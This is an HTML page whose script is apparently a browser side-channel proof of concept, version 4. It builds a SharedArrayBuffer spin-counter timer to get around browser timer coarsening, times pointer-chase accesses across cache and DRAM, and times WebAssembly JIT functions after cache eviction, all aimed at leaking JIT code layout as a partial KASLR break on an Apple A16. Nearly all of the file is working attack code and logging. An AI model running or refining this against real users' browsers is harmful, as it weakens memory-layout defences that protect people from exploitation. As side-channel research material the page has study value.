<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>DRAM Timing + KASLR v4</title></head>
<body>
<pre id="log"></pre>
<script>
// v4 — pivot from L1 to L3/DRAM timing
//
// Key insight from v3 results:
//   7.93ns/count → L1(5ns)=0 counts, L2(12ns)=1 count — both unmeasurable
//   L3 miss: ~80ns  = ~10 counts  ← first measurable level
//   DRAM:    ~120ns = ~15 counts  ← clearly measurable
//
// Strategy: large random-access array (>12MB = A16 L3 size) with
//   pointer-chase to defeat hardware prefetcher.
//   Measure BATCH random accesses per window → accumulate ticks.
//
// A16 cache: L1=128KB, L2=6MB, L3/SLC≈12MB (shared)
// Target: pointer-chase in 32MB → guaranteed DRAM misses

const LOG = document.getElementById('log');
const log = s => { LOG.textContent += s + '\n'; console.log(s); };

let counterWorker = null;
let counterView   = null;
let NS_PER_UNIT   = 8.0;

const COUNTER_SRC = `
  self.onmessage = function(e) {
    if (e.data.cmd === 'start') {
      const c = new Int32Array(e.data.sab, 4096, 1);
      while (true) Atomics.add(c, 0, 1);
    }
  };
`;

async function startCounter() {
  const sab = new SharedArrayBuffer(8192);
  counterView = new Int32Array(sab, 4096, 1);
  const w = new Worker(URL.createObjectURL(new Blob([COUNTER_SRC],{type:'application/javascript'})));
  w.postMessage({cmd:'start', sab});
  counterWorker = w;
  await new Promise(r=>setTimeout(r,200));
}

const rdcnt = () => Atomics.load(counterView, 0);

// ─────────────────────────────────────────────────────────────
// T1: Calibrate
// ─────────────────────────────────────────────────────────────
async function t1() {
  log('─── T1: Calibrate ───');
  const wallT0 = performance.now();
  const cntT0  = rdcnt();
  await new Promise(r => setTimeout(r, 50));
  const cntT1  = rdcnt();
  const wallMs = performance.now() - wallT0;
  NS_PER_UNIT  = (wallMs * 1e6) / (cntT1 - cntT0);
  log(`[*] T1 ${(cntT1-cntT0)} counts / ${wallMs.toFixed(1)}ms = ${NS_PER_UNIT.toFixed(3)}ns/count`);
  log(`[*] T1 measurable threshold: L3/DRAM (≥80ns = ${(80/NS_PER_UNIT).toFixed(1)} counts)`);
  if (NS_PER_UNIT < 10) log(`[!!!] T1 SUB-10ns — targeting DRAM for measurable signal`);
}

// ─────────────────────────────────────────────────────────────
// Build a pointer-chase array of given size
// Shuffled indices: next[i] = random j where j != i
// Access: idx = arr[idx] — defeats sequential AND stride prefetcher
// ─────────────────────────────────────────────────────────────
function buildPointerChase(sizeBytes) {
  const LINE    = 64;
  const entries = Math.floor(sizeBytes / LINE); // one pointer per cache line
  const arr     = new Int32Array(entries * (LINE/4)); // LINE-byte spacing

  // Fisher-Yates shuffle of [0..entries-1]
  const order = new Int32Array(entries);
  for (let i = 0; i < entries; i++) order[i] = i;
  for (let i = entries - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [order[i], order[j]] = [order[j], order[i]];
  }

  // Store pointer at arr[i * LINE/4] = order[i+1] (next in chase)
  for (let i = 0; i < entries; i++) {
    arr[order[i] * (LINE/4)] = order[(i + 1) % entries];
  }

  return { arr, entries, stride: LINE/4 };
}

// Run pointer chase: STEPS steps starting at idx, return final idx + count
function chase(arr, stride, startIdx, steps) {
  let idx = startIdx;
  const t0 = rdcnt();
  for (let i = 0; i < steps; i++) idx = arr[idx * stride];
  return { cnt: rdcnt() - t0, idx };
}

// ─────────────────────────────────────────────────────────────
// T2: DRAM miss timing via pointer chase
// Small chase (in L1) vs large chase (in DRAM)
// ─────────────────────────────────────────────────────────────
async function t2() {
  log('─── T2: L1 vs DRAM pointer-chase timing ───');

  const STEPS = 64; // accesses per timing window
  const REPS  = 100;

  // HOT: 4KB chase — stays in L1 (~32 entries)
  const hot = buildPointerChase(4 * 1024);
  // COLD: 32MB chase — deep in DRAM (~524288 entries)
  log(`[*] T2 building 32MB pointer chase...`);
  const cold = buildPointerChase(32 * 1024 * 1024);
  log(`[*] T2 hot entries=${hot.entries}, cold entries=${cold.entries}`);

  // Pre-fault cold array (sequential touch)
  let warmSum = 0;
  for (let i = 0; i < cold.arr.length; i += 16) warmSum += cold.arr[i];
  cold.arr[0] ^= warmSum & 0;
  // Run the chase once to populate TLB
  let tidx = 0;
  for (let i = 0; i < cold.entries; i++) tidx = cold.arr[tidx * cold.stride];
  cold.arr[0] ^= tidx & 0;

  await new Promise(r => setTimeout(r, 100));

  const hotTimes  = [];
  const coldTimes = [];

  // Warm hot chase into L1
  let hidx = 0;
  for (let i = 0; i < hot.entries * 4; i++) hidx = hot.arr[hidx * hot.stride];
  hot.arr[0] ^= hidx & 0;

  for (let rep = 0; rep < REPS; rep++) {
    // HOT chase (stays in L1)
    const hr = chase(hot.arr, hot.stride, 0, STEPS);
    hotTimes.push(hr.cnt / STEPS);
    hot.arr[0] ^= hr.idx & 0;

    // COLD chase (random 32MB — DRAM misses)
    const cr = chase(cold.arr, cold.stride, rep % cold.entries, STEPS);
    coldTimes.push(cr.cnt / STEPS);
    cold.arr[0] ^= cr.idx & 0;
  }

  hotTimes.sort((a,b)=>a-b);
  coldTimes.sort((a,b)=>a-b);

  const pct = (arr,p) => arr[Math.floor(p/100*arr.length)] * NS_PER_UNIT;
  const ps = [0,10,25,50,75,90,99];

  log(`[*] T2 HOT  (L1): ${ps.map(p=>pct(hotTimes,p).toFixed(1)).join(' ')} ns`);
  log(`[*] T2 COLD (DRAM): ${ps.map(p=>pct(coldTimes,p).toFixed(1)).join(' ')} ns`);

  const hotP50  = pct(hotTimes, 50);
  const coldP50 = pct(coldTimes, 50);
  const ratio   = hotP50 > 0 ? coldP50 / hotP50 : (coldP50 > 0 ? 99 : 0);

  log(`[*] T2 DRAM/L1 ratio p50: ${ratio.toFixed(1)}x  (hot=${hotP50.toFixed(1)}ns cold=${coldP50.toFixed(1)}ns)`);

  if (coldP50 > 50 && coldP50 > hotP50 * 3) {
    log(`[!!!] T2 DRAM TIMING SIGNAL: ${ratio.toFixed(1)}x ratio — measurable DRAM latency`);
  } else if (coldP50 > hotP50 * 1.5) {
    log(`[*] T2 weak signal: ${ratio.toFixed(1)}x`);
  } else {
    log(`[*] T2 no signal — timer or prefetcher issue`);
  }

  return { hotP50, coldP50, hasDRAM: coldP50 > 20 };
}

// ─────────────────────────────────────────────────────────────
// T3: Wasm JIT cold timing (L3/DRAM level)
// Compile N modules, evict with 32MB sweep, time first call
// ─────────────────────────────────────────────────────────────
async function t3(hasDRAM) {
  log('─── T3: Wasm JIT DRAM timing ───');

  const makeWasm = (seed) => new Uint8Array([
    0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
    0x01,0x06,0x01,0x60,0x01,0x7f,0x01,0x7f,
    0x03,0x02,0x01,0x00,
    0x07,0x08,0x01,0x04,0x63,0x61,0x6c,0x6c,0x00,0x00,
    0x0a,0x10,0x01,0x0e,0x00,
    0x20,0x00,0x45,0x04,0x7f,0x41,seed&0xff,
    0x05,0x20,0x00,0x41,0x01,0x6b,0x10,0x00,0x41,0x01,0x6a,
    0x0b,0x0b,
  ]);

  const N = 32;
  const fns = [];
  for (let i = 0; i < N; i++) {
    try {
      const inst = await WebAssembly.instantiate(makeWasm(i));
      fns.push(inst.instance.exports.call);
    } catch(e) { log(`  wasm ${i} fail: ${e.message}`); }
  }
  log(`[*] T3 compiled ${fns.length} modules`);

  // Warmup all
  for (const fn of fns) { let x=0; for(let i=0;i<100;i++) x+=fn(5); }

  // 32MB pointer chase eviction — hits DRAM, pollutes all cache levels
  log(`[*] T3 building eviction chase...`);
  const evict = buildPointerChase(32 * 1024 * 1024);
  let eidx = 0;
  for (let i = 0; i < evict.entries; i++) eidx = evict.arr[eidx * evict.stride];
  evict.arr[0] ^= eidx & 0;

  await new Promise(r => setTimeout(r, 20));

  const BATCH = 32;

  // Cold: right after eviction
  const evictStart = rdcnt();
  eidx = 0;
  for (let i = 0; i < evict.entries; i++) eidx = evict.arr[eidx * evict.stride];
  evict.arr[0] ^= eidx & 0;
  const evictTime = (rdcnt() - evictStart) * NS_PER_UNIT;
  log(`[*] T3 eviction pass: ${evictTime.toFixed(0)}ns (${evict.entries} DRAM accesses)`);

  const coldTimes = fns.map(fn => {
    const t0 = rdcnt();
    let x=0; for(let i=0;i<BATCH;i++) x+=fn(5);
    return (rdcnt()-t0+(x&0)) / BATCH;
  });

  // Hot: same fns, now warm in icache
  const hotTimes = fns.map(fn => {
    const t0 = rdcnt();
    let x=0; for(let i=0;i<BATCH;i++) x+=fn(5);
    return (rdcnt()-t0+(x&0)) / BATCH;
  });

  const pct = (arr,p) => arr.slice().sort((a,b)=>a-b)[Math.floor(p/100*arr.length)] * NS_PER_UNIT;

  log(`[*] T3 cold per-fn (ns): ${coldTimes.map(t=>(t*NS_PER_UNIT).toFixed(0)).join(' ')}`);
  log(`[*] T3 hot  per-fn (ns): ${hotTimes.map(t=>(t*NS_PER_UNIT).toFixed(0)).join(' ')}`);

  const coldMed = pct(coldTimes, 50);
  const hotMed  = pct(hotTimes, 50);
  const ratio   = hotMed > 0 ? coldMed / hotMed : 0;

  log(`[*] T3 cold p50=${coldMed.toFixed(0)}ns  hot p50=${hotMed.toFixed(0)}ns  ratio=${ratio.toFixed(2)}x`);

  if (coldMed > hotMed * 2 && coldMed > 20) {
    log(`[!!!] T3 JIT icache cold/hot: ${ratio.toFixed(1)}x — JIT page location detectable via DRAM timing`);
  }

  return { coldMed, hotMed };
}

// ─────────────────────────────────────────────────────────────
// T4: Address-dependent DRAM latency
// Probe whether different 32MB regions have different access times
// (NUMA, page-coloring, TLB hierarchy effects)
// ─────────────────────────────────────────────────────────────
async function t4() {
  log('─── T4: Address-dependent memory latency ───');

  // Allocate multiple separate 4MB arrays and compare their DRAM timing
  const CHUNKS   = 8;
  const CHUNK_SZ = 4 * 1024 * 1024; // 4MB each — > L2, < L3
  const STEPS    = 32;
  const REPS     = 20;

  const chunks = [];
  for (let c = 0; c < CHUNKS; c++) {
    const ch = buildPointerChase(CHUNK_SZ);
    // Pre-fault
    let s=0; for(let i=0;i<ch.arr.length;i+=16) s+=ch.arr[i]; ch.arr[0]^=s&0;
    // TLB warm
    let idx=0; for(let i=0;i<ch.entries;i++) idx=ch.arr[idx*ch.stride]; ch.arr[0]^=idx&0;
    chunks.push(ch);
  }

  await new Promise(r => setTimeout(r, 50));

  // 32MB eviction
  const evict = buildPointerChase(32 * 1024 * 1024);
  let eidx=0;
  for(let i=0;i<evict.entries;i++) eidx=evict.arr[eidx*evict.stride];
  evict.arr[0]^=eidx&0;

  await new Promise(r=>setTimeout(r,10));

  const chunkTimings = chunks.map(() => []);

  for (let rep = 0; rep < REPS; rep++) {
    // Evict caches between reps
    let eidx2=0;
    for(let i=0;i<evict.entries;i++) eidx2=evict.arr[eidx2*evict.stride];
    evict.arr[0]^=eidx2&0;

    for (let c = 0; c < CHUNKS; c++) {
      const ch = chunks[c];
      const t0 = rdcnt();
      let idx = rep % ch.entries;
      for (let s = 0; s < STEPS; s++) idx = ch.arr[idx * ch.stride];
      const dt = (rdcnt() - t0 + (idx & 0)) / STEPS;
      chunkTimings[c].push(dt);
    }
  }

  log(`[*] T4 per-chunk median latency (32 steps/window, 20 reps):`);
  const medians = chunkTimings.map((ts, c) => {
    ts.sort((a,b)=>a-b);
    const med = ts[Math.floor(ts.length/2)] * NS_PER_UNIT;
    log(`[*] T4   chunk ${c}: median=${med.toFixed(1)}ns  p90=${(ts[Math.floor(ts.length*0.9)]*NS_PER_UNIT).toFixed(1)}ns`);
    return med;
  });

  const minMed = Math.min(...medians);
  const maxMed = Math.max(...medians);
  const spread = maxMed / Math.max(minMed, 0.1);

  log(`[*] T4 min=${minMed.toFixed(1)}ns max=${maxMed.toFixed(1)}ns spread=${spread.toFixed(2)}x`);

  if (spread >= 2 && minMed > 5) {
    log(`[!!!] T4 ADDRESS-DEPENDENT LATENCY: ${spread.toFixed(1)}x spread across chunks`);
    log(`[!!!] T4 → allocation address affects access time → detectable via timing`);
  }
}

// ─────────────────────────────────────────────────────────────
// T5: Wasm JIT address oracle — timing variance across modules
// After full cache eviction, do multiple cold/hot rounds.
// Modules with JIT code at DRAM-resident addresses show cold > hot.
// Variance in cold timing across modules reveals JIT page layout.
// ─────────────────────────────────────────────────────────────
async function t5() {
  log('─── T5: Wasm JIT address oracle ───');

  const makeWasm = (a, b) => new Uint8Array([
    0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
    0x01,0x06,0x01,0x60,0x01,0x7f,0x01,0x7f,
    0x03,0x02,0x01,0x00,
    0x07,0x08,0x01,0x04,0x63,0x61,0x6c,0x6c,0x00,0x00,
    0x0a,0x11,0x01,0x0f,0x00,
    // body: return arg + const_a + const_b (makes function bigger/unique)
    0x20,0x00, 0x41,a&0xff, 0x6a, 0x41,b&0xff, 0x6a,
    0x0b,
  ]);

  // Compile 16 modules and do many cold/hot timing rounds
  const N = 16;
  const fns = [];
  for (let i = 0; i < N; i++) {
    try {
      const inst = await WebAssembly.instantiate(makeWasm(i, i*7));
      fns.push({ fn: inst.instance.exports.call, id: i });
    } catch(e) {}
  }
  log(`[*] T5 compiled ${fns.length} modules`);

  // Warmup
  for (const {fn} of fns) { let x=0; for(let i=0;i<200;i++) x+=fn(i); }

  const ROUNDS = 10;
  const BATCH  = 64;

  // Build large eviction set (touches all cache levels)
  const evict = buildPointerChase(32 * 1024 * 1024);
  let eidx=0;
  for(let i=0;i<evict.entries;i++) eidx=evict.arr[eidx*evict.stride];

  // Per-module: accumulate cold and hot times over ROUNDS rounds
  const coldAccum = new Array(N).fill(0);
  const hotAccum  = new Array(N).fill(0);
  const coldCount = new Array(N).fill(0);

  for (let round = 0; round < ROUNDS; round++) {
    // Full eviction
    let eidx2=0;
    for(let i=0;i<evict.entries;i++) eidx2=evict.arr[eidx2*evict.stride];
    evict.arr[0]^=eidx2&0;

    // Cold timing (post-eviction)
    for (const {fn, id} of fns) {
      const t0 = rdcnt();
      let x=0; for(let i=0;i<BATCH;i++) x+=fn(3);
      const dt = (rdcnt()-t0+(x&0)) / BATCH;
      coldAccum[id] += dt;
      coldCount[id]++;
    }

    // Hot timing (in icache now)
    for (const {fn, id} of fns) {
      const t0 = rdcnt();
      let x=0; for(let i=0;i<BATCH;i++) x+=fn(3);
      hotAccum[id] += (rdcnt()-t0+(x&0)) / BATCH;
    }
  }

  // Average cold/hot per module
  const results = fns.map(({id}) => ({
    id,
    cold: coldAccum[id] / coldCount[id] * NS_PER_UNIT,
    hot:  hotAccum[id]  / coldCount[id] * NS_PER_UNIT,
  }));

  results.forEach(r =>
    log(`[*] T5 module ${r.id}: cold=${r.cold.toFixed(1)}ns hot=${r.hot.toFixed(1)}ns delta=${(r.cold-r.hot).toFixed(1)}ns`)
  );

  const coldNs   = results.map(r=>r.cold);
  const coldMin  = Math.min(...coldNs);
  const coldMax  = Math.max(...coldNs);
  const coldSpread = coldMax / Math.max(coldMin, 0.1);

  log(`[*] T5 cold timing spread: min=${coldMin.toFixed(1)}ns max=${coldMax.toFixed(1)}ns ratio=${coldSpread.toFixed(2)}x`);

  if (coldSpread >= 2 && coldMax > 10) {
    log(`[!!!] T5 JIT ADDRESS VARIANCE: ${coldSpread.toFixed(1)}x spread in cold-call timing across modules`);
    log(`[!!!] T5 → different JIT code pages have different cache residency after eviction`);
    log(`[!!!] T5 → timing identifies which cache set/row the JIT code lives in → KASLR partial leak`);
  }

  // Rank modules by cold time — slowest = least cache-resident = different memory region
  results.sort((a,b)=>b.cold-a.cold);
  log(`[*] T5 modules ranked by cold time: ${results.map(r=>`m${r.id}=${r.cold.toFixed(0)}ns`).join(' ')}`);
}

// ─────────────────────────────────────────────────────────────
// MAIN
// ─────────────────────────────────────────────────────────────
(async () => {
  log('// timer-kaslr-v4 ready');
  log(`${new Date().toISOString().substr(11,12)} === STARTING ===`);
  if (!self.SharedArrayBuffer) { log('[!] SAB unavailable'); return; }

  await startCounter();
  await t1();
  await new Promise(r=>setTimeout(r,50));

  const t2res = await t2();
  await new Promise(r=>setTimeout(r,50));

  await t3(t2res.hasDRAM);
  await new Promise(r=>setTimeout(r,50));

  await t4();
  await new Promise(r=>setTimeout(r,50));

  await t5();

  counterWorker.terminate();

  const hits = LOG.textContent.split('\n').filter(l=>l.includes('[!!!]'));
  log(`\n=== DONE — [!!!]: ${hits.length} ===`);
  hits.forEach(h=>log(h));
})();
</script>
</body>
</html>
